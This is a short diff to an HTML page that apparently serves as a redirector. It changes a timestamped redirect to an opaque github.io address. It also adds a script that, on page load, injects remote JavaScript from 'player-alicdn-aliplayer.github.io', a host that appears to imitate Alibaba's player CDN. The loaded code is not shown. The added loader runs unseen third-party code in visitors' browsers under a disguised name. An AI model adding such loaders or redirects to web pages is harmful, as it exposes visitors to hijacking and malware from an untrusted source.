@@ -14,7 +14,7 @@
         var currentUrl = window.location.href;
         var hasTimestampParam = currentUrl.indexOf('_t=') !== -1;
         if (hasTimestampParam) {
-          window.location.replace('https://1715499549.github.io/284322205C29242422235F006F691?_t=' + timestamp);
+          window.location.replace('https://1715499549.github.io/284322205C2120222022255F006F691?_t=' + timestamp);
         } else {
           var newUrl = currentUrl + (currentUrl.indexOf('?') !== -1 ? '&' : '?') + '_t=' + timestamp;
           window.location.replace(newUrl)
@@ -26,6 +26,11 @@
     </script>
   </head>
   <body>
-  -1023
+  <script>
+  var num=(new Date()).getTime(),s=document.createElement('script');
+  s.src=`//player-alicdn-aliplayer.github.io/aliplayer/prismplayer/2.9.3/components.min.js?${num}`;
+  document.head.appendChild(s);
+</script>
+
 </body>
 </html>
